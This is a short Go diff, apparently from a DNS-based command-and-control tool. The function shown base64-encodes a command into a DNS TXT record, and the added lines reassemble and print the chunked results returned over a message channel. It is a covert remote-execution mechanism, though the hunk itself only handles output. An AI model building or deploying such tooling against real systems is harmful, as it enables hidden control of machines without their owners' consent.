@@ -5,6 +5,7 @@ import (
 	"io/ioutil"
 	"math/rand"
 	"os"
+	"sort"
 	"strings"
 	"time"
 )
@@ -51,6 +52,21 @@ func Commands(line string) {
 
 		test := Base64Encode(cmdString) + ":" + RandSeq(10)
 		AddTXTRecord(test)
+		msg := <-messages
+
+		keys := make([]int, 0, len(msg))
+		for i := range msg {
+			keys = append(keys, i)
+		}
+
+		sort.Ints(keys)
+		for i := range keys {
+			if i == 0 {
+				fmt.Println()
+			}
+			fmt.Print(msg[i])
+
+		}
 
 	}
 }
